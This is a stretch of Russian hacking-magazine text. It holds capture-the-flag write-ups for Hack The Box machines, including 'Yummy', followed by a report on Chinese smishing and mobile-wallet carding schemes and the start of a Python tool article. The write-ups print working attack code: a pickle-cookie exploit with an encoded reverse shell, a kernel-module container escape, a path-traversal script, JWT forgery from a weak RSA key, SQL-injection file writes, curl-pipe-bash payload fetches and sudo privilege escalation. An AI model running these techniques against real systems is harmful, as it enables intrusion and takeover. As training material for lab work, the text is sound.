from django.core import signing
from django.conf import settings


settings.configure(SECRET_KEY="55A6cc8e2b8#ae1662c34)
618U549601$7eC3f0@b1e8c2577J22a8f6edcb5c9b80X8f4&87b")


import subprocess


class CreateTmpFile(object):
    def __reduce__(self):
        return (subprocess.call, (['bash', '-c','echo
L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuODcvN
DMyMSAwPiYxJw==
| base64 -d | bash'],))


sess = signing.dumps(obj=CreateTmpFile(), serializer=PickleSerializer
, salt='django.contrib.sessions.backends.signed_cookies' )
print(sess)





                            Создание сессии

Теперь запускаем листенер pwncat-cs -lp 4321 и отправляем запрос к сер‐
веру, где используем сгенерированные cookie. Сразу же получаем сессию
от имени рута.





                             Запрос к серверу





                         Сессия пользователя root


Побег из Docker
У нас есть рут в «Докере», а значит, нужно подумать, какие есть пути выхода
из него, так как это даст нам привилегии root на хостовой системе. Первым
делом проверим Linux capabilities.


Справка: Linux capabilities
В Linux пользователь root получает особый контекст при запуске любых про‐
цессов. Так, ядро и приложения, работающие от имени root, обычно пропус‐
кают любые ограничения, заданные на действия в определенном контексте,
поэтому root может делать все, что захочет. Но что, если определенному про‐
цессу, который работает в непривилегированном контексте, нужно выполнить
требующее привилегий действие, не повышая уровня прав?
   Например, бывает нужно позволить процессу производить запись в жур‐
нал аудита ядра, но не позволять отключить этот аудит. Ведь если запустить
этот процесс в контексте рута, он сможет выполнить оба действия!
   Тут на помощь и приходят Linux capabilities. Эти «возможности» предос‐
тавляют процессу не все множество привилегий, а какое‑то его подмножес‐
тво. Другими словами, все привилегии рута разбиваются на более мелкие
независимые друг от  друга  привилегии и процесс получает  только  те,
которые ему нужны.


Получить список capabilities можно с помощью команды capsh --print.





                                Linux capabilities

В списке есть возможность CAP_SYS_MODULE, которая позволяет процессу
загружать и выгружать модули ядра, предлагая прямой доступ к основным
ядерным операциям. Эта возможность обеспечивает повышение привилегий
и полную компрометацию системы, позволяя вносить изменения в ядро
и обходить все механизмы безопасности Linux, включая и изоляцию контей‐
неров. В контейнере скомпилируем следующий модуль, который выполнит
реверс‑шелл.


#include <linux/kmod.h>
#include <linux/module.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");


char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.16.87/
5432 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/
sbin:/usr/bin:/sbin:/bin", NULL };


static int __init reverse_shell_init(void) {
   return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}


static void __exit reverse_shell_exit(void) {
   printk(KERN_INFO "Exiting\n");
}


module_init(reverse_shell_init);
module_exit(reverse_shell_exit);

Теперь запускаем листенер (pwncat-cs -lp 5432) и подгружаем модуль
через insmod.


insmod reverse-shell.ko





                     Компиляция и загрузка модуля

На листенер сразу прилетает сессия рута, но уже с хостовой системы.





                           Флаг рута

Машина захвачена!
ВЗЛОМ





Сегодня я покажу, как иногда можно под‐
делать криптографический токен, если тебе
известны  ограничения  алгоритма.  Также
проведем   ряд   атак   на   веб‑сервер                                                                                         RalfHacker
и повысим привилегии в Linux через утилиту          hackerralf8@gmail.com
Rsync.


Наша цель — получение прав суперпользователя на машине Yummy с учеб‐
ной площадки Hack The Box. Уровень задания — сложный.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                        с применением средств анонимизации и вир‐
                          туализации. Не делай этого с компьютеров, где
                         есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.36    yummy.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '
 ' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Сканер нашел два открытых порта:
 • 22 — служба OpenSSH 9.6p1;
 • 80 — веб‑сервер Caddy (как показал Nmap).

Первым делом осмотримся на сайте.





                           Главная страница сайта


ТОЧКА ВХОДА

На главной странице есть форма бронирования стола.





                     Форма бронирования стола

Заполняем все поля формы случайными данными и получаем ответ, что зап‐
рос обработан.





                                 Ответ сервера

Зарегистрируемся на сайте, указав email, на который был забронирован стол.
После авторизации на сайте можно найти запись о бронировании.





                          Записи о бронировании

На сайте есть возможность сохранить запись в формате iCalendar. При этом
файл скачивается с сервера, но через обработчик на эндпоинте /export.
Это можно увидеть в Burp History.





                             Burp History




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
         HTB YUMMY
                  АТАКУЕМ ВЕБ-СЕРВЕР
           И ЭКСПЛУАТИРУЕМ СЛАБУЮ
                    КРИПТОГРАФИЮ





ТОЧКА ОПОРЫ

LFI
Попробуем выполнить обход каталога и получить содержимое файла /etc/
passwd. Для этого активируем перехватчик в Burp Proxy и выполняем
экспорт на сайте. Первый запрос в Burp Proxy пропускаем, а во втором изме‐
ним путь к файлу.





                       Первый запрос в Burp Proxy





                        Второй запрос в Burp Proxy

В итоге скачивается указанный файл /ect/passwd, а значит, есть уязвимость
обхода каталога.





                     Содержимое скачанного файла

Эксплуатация уязвимости усложняется тем, что в ответе сервера на первый
запрос есть одноразовый идентификатор, который отправляется во втором
запросе. А значит, для получения любого файла нужно выполнять два зап‐
роса.
  Для удобства напишем на Python простенький скрипт, который будет
логиниться на сайте и получать сессионный JWT, затем вторым запросом
получать одноразовый идентификатор и уже третьим — указанный файл.


import requests
import json
import sys


def get_access_token():
    url = "http://yummy.htb/login"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/
537.36",
    }


    payload = {
        "email": "ralf@ralf.com",
        "password": "<PASSWORD>"
    }


    try:
        response = requests.post(url, headers=headers, data=json.
dumps(payload))


        if response.status_code == 200:
            data = response.json()
            return data.get("access_token")
        else:
            print(f"Error {response.status_code}")
            return None
    except requests.RequestException as e:
        print(f"Error: {e}")
        return None


def get_session_token(access_token):
    url = "http://yummy.htb/reminder/21"
    headers = {
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/
537.36",
        "Cookie": "X-AUTH-Token=" + access_token
    }


    try:
        response = requests.get(url, headers=headers, allow_redirects
=False)
        if response.status_code == 302:
            set_cookie = response.headers.get("Set-Cookie")
            if set_cookie:
                for cookie in set_cookie.split(";"):
                    if cookie.strip().startswith("session="):
                        return cookie.strip().split("=", 1)[1]
            else:
                print("Header Set-Cookie invalid")
                return None
        else:
            print(f"Error {response.status_code}")
            return None
    except requests.RequestException as e:
        print(f"Error: {e}")
        return None


def get_export_file(access_token, session_token, filename):
    url = "http://yummy.htb/export/
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e" + filename
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/
537.36",
        "Cookie": "X-AUTH-Token=" + access_token + "; session=" +
session_token
    }


    try:
        response = requests.get(url, headers=headers)


        if response.status_code == 200:
            return response.text
        else:
            print(f"Error {response.status_code}")
            return None
    except requests.RequestException as e:
        print(f"Error: {e}")
        return None


access_token = get_access_token()
session_token = get_session_token(access_token)
text = get_export_file(access_token, session_token, sys.argv[1])


print(text)





                      Содержимое файла /etc/hosts

Узнать место расположения исходного кода через /proc/self/cmdline
не вышло, поэтому просто перебираем интересные системные файлы. Так
доходим до планировщика задач cron. Находим три скрипта, которые обя‐
зательно нужно изучить.





                     Содержимое файла /etc/crontab

В /data/scripts/app_backup.sh происходит переход в каталог /var/www,
где  удаляется  старый backupapp.zip и  создается новый, содержащий
каталог /opt/app.





                    Содержимое файла app_backup.sh

В /data/scripts/table_cleanup.sh есть учетные данные для подключения
к MySQL.




                   Содержимое файла table_cleanup.sh

Куда сложнее скрипт /data/scripts/dbmonitor.sh. Изучив его, отмечаем,
что если существует файл /data/scripts/dbstatus.json, то скрипт получит
имя файла по маске /data/scripts/fixer-v* и выполнит файл в bash.





                     Содержимое файла dbmonitor.sh


Broken Access
Через браузер скачиваем файл /var/www/backupapp.zip, распаковываем
и переходим к анализу исходного кода. Начинаем с файла app.py. В стро‐
ках 20–26 расположен конфиг для подключения к базе данных. Учетные дан‐
ные совпадают с теми, что были получены из скрипта table_cleanup.sh.





                       Содержимое файла app.py

С 32-й строки описан обработчик для эндпоинта /login. Строка 51 раскры‐
вает параметры для формирования JWT.





                       Содержимое файла app.py

Также файл раскрывает эндпоинт /admindashboard (строка 266). Обработчик
работает с двумя параметрами запроса s и o (строки 280–283). При этом
параметр o без какой‑либо фильтрации используется в SQL-запросе к базе
данных (строки 285–287).





                       Содержимое файла app.py

Доступ  к  странице /admindashboard  можно  получить  только с ролью
administrator, поэтому попробуем подделать JWT. Ключи для JWT фор‐
мируются в файле config/signature.py.





                     Содержимое файла signature.py

Скрипт генерирует пару ключей RSA. Сначала создаются два случайных прос‐
тых числа, которые используются для вычисления числа n. Далее вычисляют‐
ся функции Эйлера и с использованием открытой экспоненты e создается
приватный ключ. Основные параметры для создания ключей — это q, n, e и p.
Параметр e имеет стандартное значение 65 537, а значение n можно
получить из JWT.





                     Декодирование JWT с помощью jwt.io

В данном алгоритме уязвим параметр q, который генерируется как случайное
                                      19      20простое число в диапазоне от 2   до 2   с помощью функции sympy.
randprime(2**19, 2**20). Однако этот диапазон слишком мал, что поз‐
воляет просто перебрать все возможные значения q. Зная n и q, можно прос‐
то вычислить p напрямую. Таким образом раскрываются все параметры,
а значит, и сам закрытый ключ.
   Следующий скрипт определяет параметры, декодирует JWT, изменяет
в нем роль и кодирует обратно (значения токена и n сокращены).


from Crypto.PublicKey import RSA
import sympy
import jwt



original_jwt = "eyJhb...indORI"
n = 697...1241
e = 65537


p, q = list(sympy.factorint(n).keys())
phi_n = (p - 1) * (q - 1)
d = pow(e, -1, phi_n)
key = RSA.construct((n, e, d))


signing_key = key.export_key()
decoded_payload = jwt.decode(original_jwt, signing_key, algorithms=["
RS256"], options={"verify_signature": False})
decoded_payload['role'] = 'administrator'
new_jwt = jwt.encode(decoded_payload, signing_key, algorithm='RS256')


print(new_jwt)

В настройках Burp Proxy ставим автозамену старого JWT измененным. После
этого переходим к странице /admindashboard и получаем административные
данные.





                             Настройки Burp Proxy





                  Содержимое страницы admindashboard


SQL Injection
Отправим запрос Search by email и просмотрим его в Burp History. На сервер
отправляется как раз тот запрос с уязвимым к SQL-инъекции параметром o.





                            Запрос на сервер

Попробуем добавить к значению ASC нагрузку ;select+123;. Сервер обра‐
ботал запрос и не вернул никаких ошибок.





                          Запрос и ответ сервера

Теперь определим, выполняется ли добавленный SQL-запрос. Будем исполь‐
зовать задержку пять секунд, для чего применим нагрузку ;select+sleep(5)
;. В правом нижнем углу Burp Repeater можно видеть время ответа сервера.
Оно превышает пять секунд, а значит, нагрузка отработала.





                          Запрос и ответ сервера

Попробуем записать что‑нибудь в файл на сервере. Дважды выполняем зап‐
рос с такой нагрузкой:


select+version()+into+outfile+"/tmp/test.txt";

Во втором ответе получаем ошибку: файл уже существует.





                          Запрос и ответ сервера

У нас появилась возможность записи файлов на сервере, а значит, вспомним
про задачи в cron. Так, мы можем записать /data/scripts/dbstatus.json,
что приведет к выполнению файла /data/scripts/fixer-vqwe, в который мы
запишем команду curl+10.10.16.59:8000/rs.sh|bash. Эта команда заг‐
рузит с нашего веб‑сервера и выполнит реверс‑шелл bash -i >& /dev/
tcp/10.10.16.59/4321 0>&1. Открываем листенер (pwncat-cs -lp 4321)
и делаем два запроса со следующими нагрузками.


select+123+into+outfile+"/data/scripts/dbstatus.json";





                         Запрос 1 и ответ сервера


select +"curl+10.10.16.59:8000/rs.sh|bash"+into+outfile+"/data/
scripts/fixer-vqwe";





                         Запрос 2 и ответ сервера

Спустя некоторое время с нашего веб‑сервера скачивается реверс‑шелл, а в
окне листенера появляется сессия в контексте службы MySQL.





                               Логи веб‑сервера





                       Сессия пользователя MySQL




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
         HTB YUMMY
                  АТАКУЕМ ВЕБ-СЕРВЕР
           И ЭКСПЛУАТИРУЕМ СЛАБУЮ
                    КРИПТОГРАФИЮ





ПРОДВИЖЕНИЕ

Пользователь www-data
Вернемся к задачам Cron и обратим внимание, что скрипт app_backup.sh
выполняется  от  имени  пользователя www-data,  то  есть его  запускает
веб‑сервер.





                                Задачи Cron

Поднимаем  второй  листенер   (pwncat-cs  -lp  5432)  и  записываем
реверс‑шелл  в файл /data/scripts/app_backup.sh.  Почти  мгновенно
получаем вторую сессию от имени www-data.


mv /data/scripts/app_backup.sh /data/scripts/app_backup.sh.old
echo 'bash -i >& /dev/tcp/10.10.16.59/5432 0>&1' > /data/scripts/app_
backup.sh





                      Сессия пользователя www-data


Пользователь qa
У нас есть сессия в контексте веб‑сервера, так что сразу поищем пароли
в каталоге с сайтами.


cd /var/www-data/app-qatesting
grep -iR password ./





                           Поиск строки password

В файле ./.hg/store/data/app.py.i есть слово password, но, так как файл
не текстовый, строка не может быть отображена. Выводим строки из этого
файла командой strings и получаем два пароля в открытом виде.


strings ./.hg/store/data/app.py.i





                           Строки в файле app.py.i

Логинимся от имени пользователя qa и получаем первый флаг.





                       Флаг пользователя


Пользователь dev
Первым делом командой sudo -l проверяем файл sudoers и узнаём, что
пользователь qa может выполнить команду /usr/bin/hg pull /home/dev/
app-production/ от имени пользователя dev.





                               Настройки sudoers

Команда hg характерна для Mercurial — системы контроля версий, похожей
на Git. Как и Git, Mercurial может использовать хуки, а значит, мы можем
зарегистрировать хук и выполнить произвольный скрипт в контексте поль‐
зователя dev. Первым делом запустим листенер (pwncat -lp 4321) и сде‐
лаем скрипт /tmp/rs.sh с реверс‑шеллом, который будем выполнять через
хук.


#!/bin/bash
bash -i >& /dev/tcp/10.10.16.59/4321 0>&1

Теперь создадим репозиторий Mercurial.


mkdir /tmp/hg
cd /tmp/hg
hg init

Скопируем файл с настройками Mercurial из домашнего каталога пользовате‐
ля в созданный репозиторий. Затем добавим в него блок hooks.


cp /home/qa/.hgrc /tmp/hg/.hg/hgrc





                 Исходный файл конфигураций Mercurial


[hooks]
pre-pull = /tmp/rs.sh





                                  Регистрация хука

Теперь выполним команду pull от имени пользователя dev и получим сессию
в pwncat.


sudo -u dev /usr/bin/hg pull /home/dev/app-production/





                         Сессия пользователя dev


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Проверяем настройки sudoers для нового пользователя. Пользователь dev
может выполнить вот такую команду в привилегированном контексте:


/usr/bin/rsync -a --exclude\=.hg /home/dev/app-production/* /opt/app/




                               Настройки sudoers

Rsync — это инструмент для оптимальной синхронизации файлов и катало‐
гов. В нашей команде используется параметр -a, который сохранит атрибуты
файлов при копировании между каталогами /home/dev/app-production/ и /
opt/app/.  Значит, мы  можем  поместить  в  каталог  /home/dev/app-
production/ файл командной оболочки Bash, назначить ему S-бит и ско‐
пировать любой файл с помощью Rsync, добавив параметр --chown.


Справка: бит SUID
Когда у файла установлен атрибут setuid (S-атрибут), обычный пользователь,
запускающий этот файл, получает повышение прав до пользователя — вла‐
дельца файла в рамках запущенного процесса. После получения повышенных
прав приложение может выполнять задачи, которые недоступны обычному
пользователю. Из‑за возможности состояния гонки многие операционные
системы игнорируют S-атрибут, установленный shell-скриптам.


Добавить параметр мы можем после каталога /home/dev/app-production/,
так как в маске дальше идет звездочка. В результате у нас получится команда,
разрешенная для выполнения через sudo.


cp /bin/bash ~/app-production/bash
chmod u+s ~/app-production/bash
sudo /usr/bin/rsync -a --exclude=.hg /home/dev/app-production/*
--chown root:root /opt/app/


/opt/app/bash -p





                           Флаг рута

Машина захвачена!
ПРИВАТНОСТЬ





Кардинг — темное ремесло похищения, продажи и прокачки
ворованных платежных карт — годами был вотчиной русских
хакеров. Массовый переход США на чипованные карты под‐
рубил этот бизнес под корень. Но китайские киберпрес‐
тупники не дремлют: их свежие схемы дают индустрии вто‐
рое дыхание. Теперь украденные данные карт превраща‐
ются в мобильные кошельки, с которыми можно шопиться
не только онлайн, но и в обычных магазинах.


От редакции
Мы решили в качестве эксперимента начать знакомить читателей с лучшими
мировыми исследованиями. Далее — близкий  к  тексту пересказ  поста
из блога Брайана Кребса. Эта публикация доступна без платной подписки.



Почти каждый американец за последние пару лет ловил хотя бы одно фишин‐
говое сообщение. То «Почта США» срочно требует доплатить за доставку, то
«местный оператор платных дорог» грозит штрафом за неоплаченный про‐
езд.
   Эти сообщения рассылаются с помощью продвинутых фишинг‑китов,
которыми барыжат киберпреступники с материкового Китая. Но это не прос‐
то стандартный «смишинг» через SMS — они вообще обходят мобильные
сети стороной. Вместо этого атаки идут через iMessage на айфонах и RCS —
на Android.





                        Фишинг‑киты в продаже

Если жертва введет данные карты на таком фейковом сайте, ее убедят, что
банк  хочет  проверить  крошечный  платеж,  высылая  одноразовый  код.
На самом деле этот код приходит не просто так — банк подтверждает привяз‐
ку карты к мобильному кошельку. То есть жертва своими руками отдает
мошенникам ключи от своего сейфа.
   Если жертва ведется и вводит код, фишеры мгновенно привязывают карту
к новому мобильному кошельку Apple или Google, который тут же загружают
на свой девайс. Теперь у них в руках полностью рабочая цифровая копия кар‐
ты, готовая к шопингу.


КАРДИНГ 2.0

Форд Меррилл, специалист по безопасности из SecAlliance (дочка CSIS
Security Group), уже давно копает тему китайских «смишеров» и наблюдает
за их эволюцией. Интересный факт: большинство этих группировок в своих
Telegram-каналах выкладывают обучающие видео, где детально показывают,
как загружать на один телефон кучу ворованных цифровых кошельков. Потом
такие «заряженные» смартфоны продаются оптом по несколько сотен баксов
за штуку.
   «Кто  сказал, что кардинг умер? — задается вопросом Меррилл. —
Это лучший клонер магнитных полос за всю историю! Продавцы требуют, что‐
бы покупатель брал минимум десять телефонов, и готовы отгружать их ави‐
адоставкой».
  В одном из рекламных видео можно наблюдать целые штабеля ящиков,
набитых телефонами на продажу. Если приглядеться, на каждом аппарате
есть наклейка с каракулями: дата загрузки кошельков, их количество и ини‐
циалы продавца. Настоящий кардинг‑конвейер в действии.





                   Телефоны с заряженными кошельками

Меррилл рассказывает, что китайские кардеры обналичивают украденные
мобильные кошельки через фейковые онлайн‑магазины, зарегистрирован‐
ные на Stripe или Zelle. Схема простая: прогоняют транзакции на суммы
от 100 до 500 долларов, и деньги плавно перетекают в их карманы.
   Меррилл отмечает, что, когда эти фишинговые банды только начинали
активничать пару лет назад, они выжидали по 60–90 дней перед тем, как сли‐
вать телефоны или использовать их в мошенничестве. Теперь же сроки сжа‐
лись до недели‑двух — обороты растут, и никто не хочет ждать.
   «Сначала эти ребята играли вдолгую, — говорит Меррилл. — А теперь все
иначе: проходит максимум десять дней, и кошельки начинают жестко про‐
качивать».


ПРИЗРАЧНЫЙ ТАП

Еще один способ обналички — реальные POS-терминалы. Мошенники прос‐
то прокатывают ворованные мобильные кошельки через Tap to Pay, один
за другим. Но есть и кое‑что поинтереснее: Меррилл выяснил, что одна
из китайских фишинговых банд толкает Android-приложение под названием
ZNFC. Эта штука умеет пересылать легитимные NFC-транзакции в любую точ‐
ку мира. Все, что нужно, — поднести телефон к местному терминалу, который
принимает Apple Pay или Google Pay, а дальше приложение передаст платеж‐
ку через интернет с устройства, например, в Китае (есть видео с демонстра‐
цией).
   «Этот софт работает откуда угодно, — объясняет Меррилл. — За 500 бак‐
сов в месяц они продают доступ к программе, которая может ретрансли‐
ровать как NFC-платежи, так и любые цифровые кошельки. И да, у них даже
круглосуточная техподдержка!»
   Появление мобильного софта для так называемого призрачного тапа
впервые зафиксировали эксперты ThreatFabric в ноябре 2024 года. По словам
коммерческого директора компании Энди Чандлера, с тех пор их аналитики
обнаружили, что целый ряд преступных группировок из разных уголков мира
подхватили эту схему.
   Чандлер отмечает, что среди новых игроков — организованные прес‐
тупные группы из Европы. Они используют похожие атаки на мобильные
кошельки и NFC, но их цель — банкоматы, поддерживающие снятие денег
со смартфонов.
  «Об этом никто не говорит, но мы уже насчитали десять разных схем
с одним и тем же принципом работы, и каждая из них по‑своему уникальна, —
говорит Чандлер. — Масштабы гораздо больше, чем банки готовы признать».
  В ноябре 2024 года The Straits Times из Сингапура сообщила о задер‐
жании трех иностранных граждан, которых завербовали через соцсети. Им
выдали «призрачные» тап‑приложения и отправили на шопинг за дорогими
товарами.
  С 4 ноября как минимум десять жертв мошенников заявили о несанкци‐
онированных транзакциях на сумму более 100 тысяч долларов. Деньги ушли
на покупку айфонов, зарядок и ювелирки в Сингапуре, писала The Straits
Times. В другом случае с аналогичной схемой 8 ноября полиция задержала
малайзийскую пару.





                   Задержание преступников в Сингапуре


ПРОДВИНУТЫЕ ФИШИНГОВЫЕ ТЕХНИКИ

По словам Меррилла, фейковые страницы почты США и операторов платных
дорог оснащены рядом хитроумных нововведений, заточенных на выжимание
максимума данных из жертвы.
   Например, жертва может начать вводить свои личные и финансовые дан‐
ные, но в последний момент заподозрить подвох и передумать. Однако
это не спасет ее — все, что она набирает в полях формы, утекает мошен‐
никам в реальном времени, даже если она так и не нажмет заветную кнопку
«Отправить».
   Меррилл отмечает, что после ввода данных карты жертве часто показы‐
вают сообщение о том, что платеж не прошел, и предлагают попробовать
другую карту. Этот трюк нередко позволяет мошенникам украсть не один,
а сразу несколько мобильных кошельков у одного человека.
   Обычно фишинговые сайты хранят ворованные данные прямо у себя,
из‑за чего их можно слить вместе с доменом. Но китайские киты работают
иначе: вся инфа сразу улетает на бэкенд, который контролируют сами про‐
давцы этих фишинговых инструментов. Так что, даже если один из сайтов
прикроют за мошенничество, украденные данные останутся в целости и сох‐
ранности.
  Еще одна фишка — массовая генерация учеток Apple и Google, через
которые мошенники рассылают свои спам‑сообщения. В одном из Telegram-
каналов китайские фишеры даже запостили фото своего «фермерского»
сетапа: десятки телефонов, забитых бот‑аккаунтами, аккуратно расставлены
на многоярусной стойке, а напротив — оператор всей этой фишинговой фаб‐
рики.





                                Рыбалка в разгаре

За работой этих фишинговых сайтов стоят живые люди, которые заняты
делом, пока рассылаются новые сообщения. По словам Меррилла, мошен‐
ники шлют всего по несколько десятков SMS за раз, потому что дальше им
самим приходится вручную доводить каждую жертву до финала. Ведь одно‐
разовые коды для привязки карт к мобильным кошелькам работают всего
пару минут, так что действовать нужно быстро.
   Любопытная деталь: фейковые сайты почты и платных дорог вообще
не открываются в обычном браузере. Они загружаются, только если опре‐
делить, что жертва зашла с мобильного устройства.
  «Им важно, чтобы жертва заходила именно с телефона, — объясняет Мер‐
рилл. — Так они гарантируют, что одноразовый код придет на то же устрой‐
ство, а не на какой‑нибудь другой гаджет. Плюс так меньше шансов, что
человек передумает и уйдет. А чтобы оперативно подхватить этот код и акти‐
вировать мобильный кошелек, нужен живой оператор».
   Меррилл обнаружил еще один коварный апгрейд в китайских фишинговых
китах — они автоматически превращают украденные данные карт в цифровые
копии настоящих. Система генерирует изображение карты с правильным
дизайном, соответствующим банку жертвы. В итоге привязать ворованную
карту к Apple Pay становится элементарно — достаточно просто отсканиро‐
вать подделку камерой айфона.
  В Telegram-канале одной из китайских фишинговых групп можно найти
рекламу их сервиса, где наглядно показано, как украденные данные карт
превращаются в реалистичные изображения самих карт.





  Реклама фишинг‑кита демонстрирует, как данные превращаются в кар‐
  точку

«Телефон не отличает реальную карту от картинки, — поясняет Меррилл. —
Он просто сканирует изображение в Apple Pay, который затем говорит: „Окей,
теперь подтвердите, что карта ваша“, — и шлет одноразовый код».


ПРОФИТ

Насколько прибыльны эти мобильные фишинговые киты? Лучшие догадки
пока что исходят от других исследователей кибербезопасности, которые уже
давно следят за китайскими фишерами и их продвинутыми схемами.
  В августе 2023 года специалисты Resecurity раскопали уязвимость в плат‐
форме одного из популярных китайских фишинговых сервисов. Она случайно
открыла доступ к личным и финансовым данным жертв. Исследователи наз‐
вали эту группировку Smishing Triad и выяснили, что за время работы она соб‐
рала 108 044 платежные карты через 31 фишинговый домен — в сред‐
нем 3485 карт на каждый сайт.
  В августе 2024 года исследователь безопасности Грант Смит выступил
на DEFCON, рассказав, как он вышел на Smishing Triad после того, как мошен‐
ники, прикинувшиеся почтой США, развели его жену. Найдя другую уяз‐
вимость в их фишинговом ките, Смит смог увидеть, что через 1133 фейковых
сайта прошло 438 669 уникальных кредитных карт — в среднем 387 карт
на домен.
  По  расчетам  Меррилла,  каждая  карта,  превращенная  в мобильный
кошелек, приносит от 100 до 500 долларов ущерба для жертвы. За год, про‐
шедший между отчетом Resecurity и докладом Смита на DEFCON, исследова‐
тели зафиксировали почти 33 тысячи уникальных доменов, связанных с китай‐
скими «смишерами».
   Если взять среднее — 1935 карт на домен — и минимальные потери
в 250 долларов США на карту, выходит, что за год эта схема принесла
мошенникам около 15 миллиардов долларов в виде фейковых транзакций.
   Меррилл не спешит раскрывать, нашел ли он новые уязвимости в фишин‐
говых китах, продаваемых китайскими группами. Он отметил, что после пуб‐
ликации статьи мошенники оперативно залатали все разоблаченные дыры.


ОТВЕТНЫЙ УДАР

Бесконтактные платежи в США взлетели после пандемии, и банки поспешили
упростить процесс привязки карт к мобильным кошелькам. В итоге основным
методом проверки личности стал одноразовый код по SMS — что, как теперь
ясно, сыграло мошенникам на руку.
   Эксперты уверены: зависимость банков от одноразовых кодов при при‐
вязке карт к мобильным кошелькам подпитывает новую волну кардинга. Krebs
on Security пообщался с топ‑менеджером крупного европейского банка (сот‐
рудник согласился говорить только на условиях анонимности — официально
комментировать тему ему запретили).
  По словам этого эксперта, задержка между кражей данных карты и ее
использованием в мошеннических схемах сильно затрудняет банкам поиск
первопричины утечек. Многие просто не могут связать фишинговые атаки
с последующими потерями.
   «Именно поэтому индустрия оказалась застигнута врасплох, — говорит
эксперт. — Многие недоумевают: как такое вообще возможно, если мы уже
токенизировали процесс, который раньше был в открытом виде? Мы никогда
не видели такого масштаба атак и жалоб со стороны жертв, как сейчас с эти‐
ми фишерами».
   Чтобы  усилить безопасность  привязки карт  к цифровым кошелькам,
некоторые банки в Европе и Азии требуют, чтобы клиент сначала вошел
в свое банковское приложение, прежде чем добавить карту на устройство.
   Борьба с угрозой «призрачного тапа» может потребовать обновления
POS-терминалов, чтобы те научились определять, когда NFC-транзакция
идет с подставного устройства. Но эксперты сомневаются, что ретейлеры
бросятся менять свое оборудование раньше, чем оно отработает свой срок.
   Ну и конечно, Apple и Google тоже придется взять на себя ответствен‐
ность — ведь их платформы используются для массовой регистрации ботов,
рассылающих фишинговый спам. Компании без  труда могут  отследить
устройства, на которые вдруг привязываются 7–10 мобильных кошельков
людей с разных концов света. Кроме того, они могли бы порекомендовать
банкам перейти на более надежные методы аутентификации при добавлении
карт в кошельки.
КОДИНГ





Как думаешь, можно ли прямо в рантайме
установить пакет Python и воспользоваться
им? Меня этот вопрос заинтересовал, так
как он  потенциально  связан с обходом
детекта вредоносного кода. Как оказалось,           pomponchik                                                                                         Разработчик, opensource-
можно! На основе своих экспериментов я               энтузиаст                                                                                              zheni-b@yandex.ru
создал инструмент instld, о котором сейчас
расскажу.


ПЕРВАЯ ДОЗА БЕСПЛАТНО

Итак, instld, как и положено приличному модулю для Python, ставится одной
командой:


pip install instld

Теперь пишем instld в консоли и видим приглашение к вводу текста.



  $ instld
 ⚡ INSTLD REPL based on
  Python 3.11.9 (v3.11.9:de54cf5be3, Apr  2 2024, 07:12:50) [Clang 13.0.0
  (clang-1300.0.29.30)] on darwin
  Type "help", "copyright", "credits" or "license" for more information.


  >>>


То, что ты сейчас видишь, — это безумная магия. Какая — расскажу чуть поз‐
же, а сейчас убедимся, что перед нами рабочий интерпретатор Python.



  >>> 5 + 5
  10
  >>> import sys
  >>> sys.version
  '3.11.9 (v3.11.9:de54cf5be3, Apr  2 2024, 07:12:50) [Clang 13.0.0 (
  clang-1300.0.29.30)]'
  >>> print("it's", 'just', 'a', 'REPL')
  it's just a REPL
  >>>


Ну да, обычный REPL. А теперь давай импортируем какой‑нибудь пакет,
который у тебя еще не установлен.



  >>> import pandas as pd
  Collecting pandas
  Downloading pandas-2.2.3-cp311-cp311-macosx_11_0_arm64.whl.metadata (89
  kB)
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 89.9/89.9 kB 143.4 kB/s eta 0:
  00:00
  Collecting numpy>=1.23.2 (from pandas)
  Using cached numpy-2.1.1-cp311-cp311-macosx_14_0_arm64.whl.metadata (60
  kB)
  Collecting python-dateutil>=2.8.2 (from pandas)
  Using cached python_dateutil-2.9.0.post0-py2.py3-none-any.whl.metadata (
  8.4 kB)
  Collecting pytz>=2020.1 (from pandas)
  Downloading pytz-2024.2-py2.py3-none-any.whl.metadata (22 kB)
  Collecting tzdata>=2022.7 (from pandas)
  Downloading tzdata-2024.2-py2.py3-none-any.whl.metadata (1.4 kB)
  Collecting six>=1.5 (from python-dateutil>=2.8.2->pandas)
